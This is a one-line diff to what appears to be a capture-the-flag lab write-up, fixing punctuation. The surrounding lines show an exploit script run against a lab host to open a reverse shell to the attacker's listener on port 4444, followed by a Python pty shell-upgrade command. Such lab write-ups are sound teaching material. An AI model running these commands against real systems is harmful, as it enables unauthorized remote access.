@@ -100,7 +100,7 @@ $ python exploit.py -t 10.10.128.215 -a 10.9.2.102 -p 4444
 And we get a reverse shell
 ![reverseShell](/assets/img/billing/revShell.png){: width="1200" height="600"}
 
-Now I recommend upgrade the shell to avoid exiting it by mistake
+Now I recommend upgrade the shell to avoid exiting it by mistake.
 ```bash
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 CTRL+Z
